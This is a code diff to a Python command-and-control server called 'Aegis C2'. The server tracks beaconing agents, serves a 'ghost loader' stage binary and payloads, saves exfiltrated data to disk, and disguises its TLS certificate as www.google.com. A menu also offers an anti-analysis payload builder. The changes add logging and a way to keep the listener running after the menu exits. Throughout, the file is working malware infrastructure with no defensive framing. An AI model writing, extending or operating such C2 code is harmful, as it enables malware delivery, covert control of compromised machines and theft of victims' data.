@@ -21,6 +21,7 @@ AGENTS = {}  # {node_id_hex: {"last_seen": timestamp, "info": {...}, "tasks": []
 ACTIVE_AGENT = None
 SERVER_RUNNING = True
 HTTPD_INSTANCE = None # Keep track of the server instance to shut it down properly
+LOG_FILE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_server.log")
 
 # ── Resolve absolute path to project root ─────────────────────────────────
 # This ensures the server works regardless of which directory it's launched from.
@@ -38,6 +39,21 @@ class Colors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
+
+# ── Logging Helper ────────────────────────────────────────────────────────
+
+def log_print(msg, color=None):
+    """Print to stdout and append to log file."""
+    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
+    clean_msg = re.sub(r'\x1b\[[0-9;]*m', '', msg) # Remove ANSI codes for file
+
+    with open(LOG_FILE_PATH, "a") as f:
+        f.write(timestamp + clean_msg + "\n")
+
+    if color:
+        print(f"{color}{msg}{Colors.ENDC}")
+    else:
+        print(msg)
 
 # ── C2 Envelope structure (must match c2_client.h) ────────────────────────
 #
@@ -173,13 +189,19 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
             response_body = b""
         else:
             # Unknown route — log it
-            print(f"{Colors.WARNING}[?] Unknown POST route: {path}{Colors.ENDC}")
+            log_print(f"[?] Unknown POST route: {path}", Colors.WARNING)
 
         self.send_response(200)
         self.send_header('Content-Type', 'application/octet-stream')
         self.send_header('Connection', 'close')
         self.end_headers()
-        self.wfile.write(response_body)
+        try:
+            self.wfile.write(response_body)
+        except ssl.SSLEOFError:
+            # Client disconnected early or protocol violation
+            pass
+        except BrokenPipeError:
+            pass
 
     def _handle_beacon(self, data):
         """
@@ -206,9 +228,9 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                     "tasks": [],
                     "sequence": seq,
                 }
-                print(f"{Colors.GREEN}[+] New Agent: {short_id} from {client_ip} (seq={seq}){Colors.ENDC}")
+                log_print(f"[+] New Agent: {short_id} from {client_ip} (seq={seq})", Colors.GREEN)
             else:
-                print(f"{Colors.CYAN}[~] Beacon: {short_id} from {client_ip} (seq={seq}){Colors.ENDC}")
+                log_print(f"[~] Beacon: {short_id} from {client_ip} (seq={seq})", Colors.CYAN)
 
             agent = AGENTS[node_id_hex]
             agent["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -221,7 +243,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
             if agent["tasks"]:
                 # Pop all pending tasks and log them
                 tasks = agent["tasks"]
-                print(f"{Colors.WARNING}  └─ {len(tasks)} pending task(s) for {short_id}{Colors.ENDC}")
+                log_print(f"  └─ {len(tasks)} pending task(s) for {short_id}", Colors.WARNING)
                 # In a production implementation, these would be encrypted with
                 # the session key and packed into a response envelope.
                 # For the prototype, we clear them after acknowledging.
@@ -229,7 +251,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         else:
             # Couldn't parse envelope — might be an old client or garbled data.
             # Fall back to IP-based tracking.
-            print(f"{Colors.WARNING}[?] Beacon from {client_ip} with unparseable envelope ({len(data)} bytes){Colors.ENDC}")
+            log_print(f"[?] Beacon from {client_ip} with unparseable envelope ({len(data)} bytes)", Colors.WARNING)
 
             existing_id = None
             for aid, info in AGENTS.items():
@@ -263,7 +285,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         if env:
             short_id = env["node_id_hex"][:8]
 
-        print(f"{Colors.BLUE}[⬇] Stage request from {short_id} ({client_ip}){Colors.ENDC}")
+        log_print(f"[⬇] Stage request from {short_id} ({client_ip})", Colors.BLUE)
 
         # Look for the ghost loader binary in known locations
         ghost_paths = [
@@ -276,14 +298,14 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
             if os.path.exists(gpath):
                 with open(gpath, "rb") as f:
                     ghost_data = f.read()
-                print(f"{Colors.GREEN}  └─ Serving ghost loader: {gpath} ({len(ghost_data)} bytes){Colors.ENDC}")
+                log_print(f"  └─ Serving ghost loader: {gpath} ({len(ghost_data)} bytes)", Colors.GREEN)
                 # In production, this would be wrapped in an encrypted envelope.
                 # The raw binary is returned for the prototype.
                 return ghost_data
 
-        print(f"{Colors.FAIL}  └─ Ghost loader not found in any known path!{Colors.ENDC}")
-        print(f"{Colors.FAIL}     Searched: {', '.join(ghost_paths)}{Colors.ENDC}")
-        print(f"{Colors.WARNING}     Build it with: make ghost_loader{Colors.ENDC}")
+        log_print(f"  └─ Ghost loader not found in any known path!", Colors.FAIL)
+        log_print(f"     Searched: {', '.join(ghost_paths)}", Colors.FAIL)
+        log_print(f"     Build it with: make ghost_loader", Colors.WARNING)
         return b""
 
     def _handle_resource_req(self, resource_id):
@@ -294,10 +316,10 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         if os.path.exists(path):
             with open(path, "rb") as f:
                 data = f.read()
-            print(f"{Colors.GREEN}[⬇] Serving resource: {resource_id} ({len(data)} bytes){Colors.ENDC}")
+            log_print(f"[⬇] Serving resource: {resource_id} ({len(data)} bytes)", Colors.GREEN)
             return data
 
-        print(f"{Colors.FAIL}[!] Resource not found: {resource_id}{Colors.ENDC}")
+        log_print(f"[!] Resource not found: {resource_id}", Colors.FAIL)
         return b""
 
     def _handle_payload_req(self, data):
@@ -309,7 +331,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         if env:
             short_id = env["node_id_hex"][:8]
 
-        print(f"{Colors.BLUE}[⬇] Payload request from {short_id} ({client_ip}){Colors.ENDC}")
+        log_print(f"[⬇] Payload request from {short_id} ({client_ip})", Colors.BLUE)
 
         # Check for a default payload in the payloads directory
         payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
@@ -320,10 +342,10 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                 ppath = os.path.join(payloads_dir, payloads[0])
                 with open(ppath, "rb") as f:
                     payload_data = f.read()
-                print(f"{Colors.GREEN}  └─ Serving payload: {payloads[0]} ({len(payload_data)} bytes){Colors.ENDC}")
+                log_print(f"  └─ Serving payload: {payloads[0]} ({len(payload_data)} bytes)", Colors.GREEN)
                 return payload_data
 
-        print(f"{Colors.FAIL}  └─ No payloads available{Colors.ENDC}")
+        log_print(f"  └─ No payloads available", Colors.FAIL)
         return b""
 
     def _handle_exfil(self, data):
@@ -335,7 +357,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         if env:
             short_id = env["node_id_hex"][:8]
 
-        print(f"{Colors.WARNING}[📤] Exfil received from {short_id} ({client_ip}): {len(data)} bytes{Colors.ENDC}")
+        log_print(f"[📤] Exfil received from {short_id} ({client_ip}): {len(data)} bytes", Colors.WARNING)
 
         # Write to exfil directory for inspection
         exfil_dir = os.path.join(PROJECT_ROOT, "exfil")
@@ -344,7 +366,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         exfil_path = os.path.join(exfil_dir, f"{short_id}_{ts}.bin")
         with open(exfil_path, "wb") as f:
             f.write(data)
-        print(f"{Colors.CYAN}  └─ Saved to {exfil_path}{Colors.ENDC}")
+        log_print(f"  └─ Saved to {exfil_path}", Colors.CYAN)
 
 
 def run_server(port=443):
@@ -356,10 +378,10 @@ def run_server(port=443):
     if not os.path.exists(cert_path):
         os.system(f"openssl req -new -x509 -keyout {cert_path} -out {cert_path} -days 365 -nodes -subj '/CN=www.google.com'")
 
-    print(f"{Colors.GREEN}[+] Starting C2 Server on 0.0.0.0:{port}...{Colors.ENDC}")
-    print(f"{Colors.CYAN}    SSL cert: {cert_path}{Colors.ENDC}")
-    print(f"{Colors.CYAN}    Payloads: {os.path.join(PROJECT_ROOT, 'payloads')}{Colors.ENDC}")
-    print(f"{Colors.CYAN}    Project:  {PROJECT_ROOT}{Colors.ENDC}")
+    log_print(f"[+] Starting C2 Server on 0.0.0.0:{port}...", Colors.GREEN)
+    log_print(f"    SSL cert: {cert_path}", Colors.CYAN)
+    log_print(f"    Payloads: {os.path.join(PROJECT_ROOT, 'payloads')}", Colors.CYAN)
+    log_print(f"    Project:  {PROJECT_ROOT}", Colors.CYAN)
 
     server_address = ('0.0.0.0', port)
 
@@ -368,8 +390,8 @@ def run_server(port=443):
         HTTPD_INSTANCE = httpd
     except OSError as e:
         if e.errno == errno.EADDRINUSE:
-            print(f"{Colors.FAIL}[!] Error: Port {port} is already in use. C2 Server thread failed to bind.{Colors.ENDC}")
-            print(f"{Colors.WARNING}    Try: sudo lsof -i :{port}  OR  sudo kill $(sudo lsof -t -i :{port}){Colors.ENDC}")
+            log_print(f"[!] Error: Port {port} is already in use. C2 Server thread failed to bind.", Colors.FAIL)
+            log_print(f"    Try: sudo lsof -i :{port}  OR  sudo kill $(sudo lsof -t -i :{port})", Colors.WARNING)
             return
         else:
             raise e
@@ -379,7 +401,7 @@ def run_server(port=443):
     context.load_cert_chain(certfile=cert_path)
     httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
 
-    print(f"{Colors.GREEN}[+] C2 Listener active. Waiting for beacons...{Colors.ENDC}")
+    log_print(f"[+] C2 Listener active. Waiting for beacons...", Colors.GREEN)
 
     while SERVER_RUNNING:
         try:
@@ -413,6 +435,7 @@ def menu_main():
     print("[3] Payload Builder (Anti-Analysis Config)")
     print("[4] Advanced Configuration")
     print("[5] Start Listener (Background)")
+    print("[6] View Logs")
     print("[0] Exit")
     print()
 
@@ -557,7 +580,7 @@ def main_loop():
     port_str = config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT")
     c2_port = int(port_str) if port_str and port_str.isdigit() else 4443
 
-    print(f"{Colors.CYAN}[*] C2 Port from config.h: {c2_port}{Colors.ENDC}")
+    log_print(f"[*] C2 Port from config.h: {c2_port}", Colors.CYAN)
 
     # Auto-start listener thread
     t = threading.Thread(target=run_server, args=(c2_port,))
@@ -591,10 +614,45 @@ def main_loop():
         elif choice == '5':
             print(f"Listener is already running on port {c2_port} (background).")
             time.sleep(1)
+        elif choice == '6':
+            print_banner()
+            print(f"{Colors.BOLD}=== Server Logs (Last 50 Lines) ==={Colors.ENDC}")
+            try:
+                if os.path.exists(LOG_FILE_PATH):
+                    with open(LOG_FILE_PATH, "r") as f:
+                        lines = f.readlines()
+                        for line in lines[-50:]:
+                            print(line.strip())
+                else:
+                    print("No logs found.")
+            except Exception as e:
+                print(f"Error reading logs: {e}")
+            input("\nPress Enter to return...")
         elif choice == '0':
+            print(f"{Colors.WARNING}[?] Stop the C2 Listener (port {c2_port})? [Y/n] {Colors.ENDC}")
+            confirm = input("Select > ").lower().strip()
+
+            if confirm == 'n':
+                print(f"{Colors.GREEN}[+] Exiting TUI. Listener will continue running in background.{Colors.ENDC}")
+                print(f"{Colors.GREEN}[+] PID: {os.getpid()}{Colors.ENDC}")
+                # We simply break the loop. The main thread exits, but non-daemon threads would keep running.
+                # However, the listener thread is daemon=True in the current code.
+                # To keep it alive, we must NOT let the main process terminate.
+                # We can just join the listener thread or loop forever silently.
+                SERVER_RUNNING = True # Keep the flag true so listener thread stays alive
+
+                # Solution: Loop forever in main thread, but without the menu.
+                print("Press Ctrl+C to stop the server completely.")
+                try:
+                    while True:
+                        time.sleep(1)
+                except KeyboardInterrupt:
+                    pass
+
             SERVER_RUNNING = False
             # Proper shutdown
             if HTTPD_INSTANCE:
+                print("Shutting down listener...")
                 HTTPD_INSTANCE.shutdown()
                 HTTPD_INSTANCE.server_close()
             sys.exit(0)
